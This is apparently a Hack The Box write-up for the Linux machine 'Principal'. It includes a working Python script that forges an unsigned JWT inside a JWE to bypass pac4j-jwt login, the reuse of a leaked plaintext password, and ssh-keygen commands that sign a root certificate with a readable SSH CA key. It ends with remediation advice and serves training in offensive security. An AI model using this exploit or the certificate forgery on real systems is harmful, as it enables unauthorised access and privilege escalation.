# HTB — Principal (Medium, Linux)

## Overview

Principal is a medium Linux machine built around JWT/JWE handling and SSH certificate authentication. A vulnerable version of pac4j-jwt allows forging an authentication token to bypass login and reach an admin dashboard, where a plaintext credential is exposed. Those credentials grant SSH access as a service account, which can read an SSH certificate authority's private key. Because sshd trusts that CA but defines no `AuthorizedPrincipalsFile`, a self-signed certificate with the `root` principal grants a root shell.

## Reconnaissance

### Port scan

````
$ nmap -sV -sC 10.129.244.220
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
````

Port 8080 runs a Jetty application that redirects to `/login`. The response headers expose `X-Powered-By: pac4j-jwt/6.0.3`.

![Login page](images/01-login.png)

### Discovering the JWKS endpoint

Reviewing the application's static assets (`static/js/app.js`) revealed an authentication endpoint, `/api/auth/jwks`:

![JWKS endpoint referenced in app.js](images/02-jwks-endpoint.png)

Protected routes return an unauthorized error without a valid token:

![Protected endpoint without authentication](images/03-jwks-unauth.png)

## Foothold

### CVE-2026-29000 — pac4j-jwt authentication bypass

pac4j-jwt 6.0.3 is affected by CVE-2026-29000, an authentication bypass. The flaw allows an attacker to wrap an **unsigned** JWT (`alg: none`) inside a JWE encrypted to the server's own public key (published at `/api/auth/jwks`). The library decrypts the JWE and then trusts the inner unsigned token, so arbitrary claims — here `sub: admin`, `role: ROLE_ADMIN` — are accepted.

I wrote a short script to fetch the public key and forge the token:

````python
import sys, json, base64, requests
from jwcrypto import jwk, jwe

def b64url(d): return base64.urlsafe_b64encode(d).rstrip(b"=")

target = sys.argv[1].rstrip("/")
jwks = requests.get(f"{target}/api/auth/jwks", verify=False).json()
pub  = jwk.JWK(**jwks["keys"][0])

hdr     = b64url(json.dumps({"alg": "none"}).encode())
payload = b64url(json.dumps({"sub": "admin", "role": "ROLE_ADMIN"}).encode())
plain_jwt = hdr + b"." + payload + b"."

token = jwe.JWE(
    plain_jwt,
    recipient=pub,
    protected={"alg": "RSA-OAEP-256", "enc": "A128GCM", "cty": "JWT"},
)
print("Authorization: Bearer " + token.serialize(compact=True))
````

Running it produced a valid admin token:

````
$ python -I forge.py http://10.129.244.220:8080
Authorization: Bearer eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV<SNIP>
````

The token granted access to the admin API:

![Accessing /api/dashboard with the forged token](images/04-api-dashboard.png)

To use the application UI, I stored the token client-side and navigated to the dashboard:

````js
sessionStorage.setItem('auth_token', '<JWE_TOKEN>')
````

![Admin dashboard](images/05-dashboard.png)

### Credential disclosure

The Security tab of the settings page exposed a plaintext password:

![Plaintext password in settings](images/06-security-password.png)

The Users tab listed a service account, `svc-deploy`, described as *"Service account for automated deployments via SSH certificate auth."* Reusing the recovered password granted SSH access as `svc-deploy`:

![SSH as svc-deploy](images/07-ssh-svc-deploy.png)

````
svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1001(svc-deploy) groups=1001(svc-deploy),1002(deployers)
````

## Privilege Escalation

### SSH certificate authority abuse

`/opt/principal/ssh/README.txt` described an SSH certificate authority trusted by sshd for certificate-based authentication:

````
CA keypair for SSH certificate automation.
This CA is trusted by sshd for certificate-based authentication.
Algorithm: RSA 4096-bit
````

The drop-in sshd config `60-principal.conf` is readable by the `deployers` group (which `svc-deploy` belongs to):

![sshd certificate configuration](images/08-sshd-config.png)

It sets `TrustedUserCAKeys` but defines **no** `AuthorizedPrincipalsFile` or `AuthorizedPrincipalsCommand`. sshd therefore accepts any certificate signed by the trusted CA, and — with no principals file — treats the certificate's principal as the target username. Since `svc-deploy` can read the CA's private key (`/opt/principal/ssh/ca`), I forged a certificate for the `root` principal.

Generate a key pair and sign it as the `root` principal with the CA:

````bash
svc-deploy@principal:/tmp$ ssh-keygen -t ed25519 -f newca -N ""
svc-deploy@principal:/tmp$ ssh-keygen -s /opt/principal/ssh/ca \
    -I newca-root -n root -V +1h /tmp/newca.pub
````

- `-s /opt/principal/ssh/ca` — the CA private key used to sign
- `-I newca-root` — certificate identity
- `-n root` — the principal (the account the cert is valid for)
- `-V +1h` — one-hour validity

![Signing the certificate](images/09-sign-cert.png)

Authenticating with the signed certificate yielded a root shell:

````bash
ssh -i /tmp/newca root@principal
````

![Root access](images/10-root.png)

## Remediation

- **pac4j-jwt (CVE-2026-29000):** Upgrade pac4j to a fixed release and reject tokens whose inner algorithm is `none`.
- **Plaintext credentials:** Never store or display passwords in plaintext; hash them and keep secrets out of the UI.
- **SSH CA key exposure:** Restrict the CA private key to root only; no service account should be able to read it.
- **Missing principals restriction:** Always configure `AuthorizedPrincipalsFile` (or `AuthorizedPrincipalsCommand`) when using `TrustedUserCAKeys`, so certificates are scoped to specific principals rather than accepted for any username.